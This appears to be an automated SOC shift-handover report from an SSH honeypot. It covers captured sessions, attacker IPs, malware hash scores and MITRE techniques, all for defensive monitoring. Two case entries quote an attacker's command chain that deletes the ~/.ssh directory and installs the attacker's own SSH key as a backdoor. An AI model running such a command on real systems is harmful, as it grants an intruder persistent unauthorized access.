| `2026-05-08 04:51:52` | `cowrie.log.closed` |
| `2026-05-08 04:51:53` | `cowrie.session.params` |
| `2026-05-08 04:51:53` | `cowrie.command.input` |
| `2026-05-08 04:51:53` | `cowrie.session.file_download` |
| `2026-05-08 04:51:53` | `cowrie.log.closed` |
| `2026-05-08 04:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8887347683f9

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-05-08 04:51 |
| **Last Seen** | 2026-05-08 04:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 04:51:57` | `cowrie.session.connect` |
| `2026-05-08 04:51:57` | `cowrie.client.version` |
| `2026-05-08 04:51:57` | `cowrie.client.kex` |
| `2026-05-08 04:51:59` | `cowrie.login.success` |
| `2026-05-08 04:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.186.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `201.186.40[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4752e81c8b8

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-05-08 05:02 |
| **Last Seen** | 2026-05-08 05:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 05:02:33` | `cowrie.session.connect` |
| `2026-05-08 05:02:33` | `cowrie.client.version` |
| `2026-05-08 05:02:33` | `cowrie.client.kex` |
| `2026-05-08 05:02:35` | `cowrie.login.success` |
| `2026-05-08 05:02:35` | `cowrie.session.params` |
| `2026-05-08 05:02:35` | `cowrie.command.input` |
| `2026-05-08 05:02:35` | `cowrie.command.failed` |
| `2026-05-08 05:02:36` | `cowrie.log.closed` |
| `2026-05-08 05:02:36` | `cowrie.session.params` |
| `2026-05-08 05:02:36` | `cowrie.command.input` |
| `2026-05-08 05:02:37` | `cowrie.session.file_download` |
| `2026-05-08 05:02:37` | `cowrie.log.closed` |
| `2026-05-08 05:02:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89d92a5cf078

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-05-08 05:02 |
| **Last Seen** | 2026-05-08 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 05:02:40` | `cowrie.session.connect` |
| `2026-05-08 05:02:40` | `cowrie.client.version` |
| `2026-05-08 05:02:40` | `cowrie.client.kex` |
| `2026-05-08 05:02:41` | `cowrie.login.success` |
| `2026-05-08 05:02:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9ffcf2382ff

| Field | Detail |
|---|---|
| **Source IP** | `222.255.214[.]79` |
| **First Seen** | 2026-05-08 05:03 |
| **Last Seen** | 2026-05-08 05:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 05:03:59` | `cowrie.session.connect` |
| `2026-05-08 05:03:59` | `cowrie.client.version` |
| `2026-05-08 05:03:59` | `cowrie.client.kex` |
| `2026-05-08 05:04:00` | `cowrie.login.success` |
| `2026-05-08 05:04:00` | `cowrie.session.params` |
| `2026-05-08 05:04:00` | `cowrie.command.input` |
| `2026-05-08 05:04:00` | `cowrie.command.failed` |
| `2026-05-08 05:04:00` | `cowrie.log.closed` |
| `2026-05-08 05:04:00` | `cowrie.session.params` |
| `2026-05-08 05:04:00` | `cowrie.command.input` |
| `2026-05-08 05:04:01` | `cowrie.session.file_download` |
| `2026-05-08 05:04:01` | `cowrie.log.closed` |
| `2026-05-08 05:04:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.255.214[.]79` to AbuseIPDB if not already reported
- [ ] Block `222.255.214[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93adf104ff61

| Field | Detail |
|---|---|
| **Source IP** | `222.255.214[.]79` |
| **First Seen** | 2026-05-08 05:04 |
| **Last Seen** | 2026-05-08 05:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 05:04:03` | `cowrie.session.connect` |
| `2026-05-08 05:04:03` | `cowrie.client.version` |
| `2026-05-08 05:04:03` | `cowrie.client.kex` |
| `2026-05-08 05:04:03` | `cowrie.login.success` |
| `2026-05-08 05:04:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.255.214[.]79` to AbuseIPDB if not already reported
- [ ] Block `222.255.214[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `120.230.181[.]16` | **30** | 2026-05-08 04:36 | 2026-05-08 04:48 | 52m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `201.186.40[.]250` | **30** | 2026-05-08 04:32 | 2026-05-08 05:14 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `222.255.214[.]79` | **30** | 2026-05-08 04:38 | 2026-05-08 05:07 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.53.233[.]96` | **25** | 2026-05-08 05:54 | 2026-05-08 06:00 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `121.142.87[.]218` | **23** | 2026-05-08 03:26 | 2026-05-08 03:49 | 0m | 22 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `139.59.112[.]10` | **23** | 2026-05-08 03:27 | 2026-05-08 03:49 | 0m | 23 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `210.14.142[.]89` | **7** | 2026-05-08 03:27 | 2026-05-08 03:37 | 9m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `18.218.118[.]203` | **2** | 2026-05-08 03:49 | 2026-05-08 03:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `102.23.122[.]235` | 1 | 2026-05-08 05:02 | 2026-05-08 05:02 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.111.141[.]7` | 1 | 2026-05-08 04:16 | 2026-05-08 04:17 | 30s | 0 | `T1592` | 🟢 LOW |
| `119.255.245[.]44` | 1 | 2026-05-08 04:27 | 2026-05-08 04:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.77[.]176` | 1 | 2026-05-08 04:14 | 2026-05-08 04:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-05-08 03:29 | 2026-05-08 03:29 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `221.139.88[.]149` | 1 | 2026-05-08 04:42 | 2026-05-08 04:43 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.107.197[.]154` | 1 | 2026-05-08 03:41 | 2026-05-08 03:41 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (26 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 40/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `120.230.181[.]16` | CN | China Mobile Communications Corporation | **100** ⚠️ | 8 |
| `27.107.197[.]154` | IN | Tata Teleservices Limited -GSM Division | **100** ⚠️ | 16 |
| `18.218.118[.]203` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `121.142.87[.]218` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `139.19.117[.]130` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
| `222.255.214[.]79` | VN | VietNam Data Communication Company | **100** ⚠️ | 50 |
| `120.48.77[.]176` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 22 |
| `112.111.141[.]7` | CN | likengmeikuang-CORP | **100** ⚠️ | 15 |
| `101.53.233[.]96` | PK | Cyber Internet Services Pakistan | **100** ⚠️ | 5 |
| `102.23.122[.]235` | ZM | INFRATEL CORPORATION LIMITED | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 167 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 114 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 18 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 9 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 9 |

---

## 🔕 False Positive Summary (11 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 206 cases |
| Tool 34  | Credential Extractor        | ✅ 133 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 26 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 11 filtered (5.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 25 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 26 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 18 priority case(s) shown individually · 15 recon entry/entries in table (8 group(s) consolidating 170 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-08T06:01:42Z_
